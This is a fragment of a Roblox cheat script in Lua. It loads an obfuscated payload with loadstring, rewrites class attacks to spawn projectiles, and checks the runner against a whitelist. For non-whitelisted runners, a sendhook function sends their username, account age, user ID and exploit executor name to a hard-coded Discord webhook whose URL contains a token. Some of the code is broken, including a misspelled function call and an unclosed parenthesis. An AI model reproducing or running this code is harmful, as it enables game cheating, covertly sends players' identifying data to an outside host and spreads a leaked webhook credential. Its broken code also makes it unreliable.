    adjustskin(n)
end
local a
if plr.PlayerGui:FindFirstChild("ClassGui") then
    a = loadstring(dec(_G.dontchange))()
else
    notify("you need to choose a class first")
end

if a then
    a.usingattack = function()
        if canatk and plr.Character.Stats.Disable.Value == 0 then
            cooling("atk", 2)
        else
            return
        end
		
	local anim = hum:LoadAnimation(game.ReplicatedStorage.Classes.SANTA.ClassGui.AttackAnim) 
		
	while game:GetService("UserInputService"):IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
		anim:Play()
		anim:AdjustSpeed(1.5)
		yescreateproj(game.ReplicatedStorage.Classes.FIRECRACKER.ability1cannon, hum.RootPart.CFrame * CFrame.new(0, -1, -2)
		task.wait(.2)
	end
    end

    a.usingability1 = function()
        if canab1 and plr.Character.Stats.Disable.Value == 0 then
            cooling("ab1", 1)
        else
            return
        end
    end

    a.usingability2 = function()
        if canab2 and plr.Character.Stats.Disable.Value == 0 then
            cooling("ab2", 1)
        else
            return
        end
    end

    a.usingcritical = function()
        if cancrit and plr.Character.Stats.Disable.Value == 0 then
            cooling("crit", 1)
        else
            return
        end
    end
end

local function sendhook()
    local webhookcheck =
        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
        secure_load and "Sentinel" or
        KRNL_LOADED and "Krnl" or
        SONA_LOADED and "Sona" or
        "Kid with shit exploit"

    local url =
        "https://discord.com/api/webhooks/1052161747831767040/bu3UXvnMyvOyKy5LKOD1bukf8RkQLHng06c3LAMoMPfovyww4JGLhES5zf7Km-vaGfOP"
    local data = {
        ["embeds"] = {
            {
                ["title"] = "unknown runner",
                ["description"] = "Username: " ..
                    game.Players.LocalPlayer.Name .. " with **" .. webhookcheck .. "** \n" .. classname,
                ["type"] = "rich",
                ["color"] = tonumber(0x7269da),
                ["fields"] = {
                    {
                        ["name"] = "Name:",
                        ["value"] = tostring(game.Players.LocalPlayer.Name),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "age",
                        ["value"] = tostring(game.Players.LocalPlayer.AccountAge),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Id",
                        ["value"] = tostring(game.Players.LocalPlayer.UserId),
                        ["inline"] = true
                    }
                }
            }
        }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)

    local headers = {
        ["content-type"] = "application/json"
    }
    local request
    if webhookcheck == "Synapse X" then
        request = syn.request
    else
        request = request or http_request or HttpPost or syn.request
    end

    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end

function removewhitelist()
    if plr.PlayerData.Inventory:FindFirstChild("took_mytime") then
        ok(plr.PlayerData.Inventory.took_mytime, workspace.Blocker)

        local whitelist = workspace.Blocker:WaitForChild("took_mytime")
        for _, v in pairs(game:GetService("Workspace").Lobby.TokenShop.Shop.EventToken:GetChildren()) do
            ok(v, whitelist)
        end

        task.wait(1)
        local args = {
            [1] = "PointTrade",
            [2] = whitelist
        }

        game:GetService("ReplicatedStorage").Remotes.Shop:FireServer(unpack(args))
    end
end

local players = {}

if not players[1] then
    players[1] = "took_mytime"
end

for _, v in pairs(players) do
    if plr.Name ~= v then
        if
            not game.Players.LocalPlayer.PlayerData.Inventory:FindFirstChild("took_mytime") or
                not game.Players.LocalPlayer.PlayerData.Inventory:FindFirstChild(IMPORTANT.Name)
         then
            removewhistlist()
            plr:Kick(
                "invalid player ran the script (oh, also i logged you)\n add rogue#2257 on discord for a whitelist (or just ask in game, i have to know who is running this one way or another)"
            )
            sendhook()
        end
    end
end
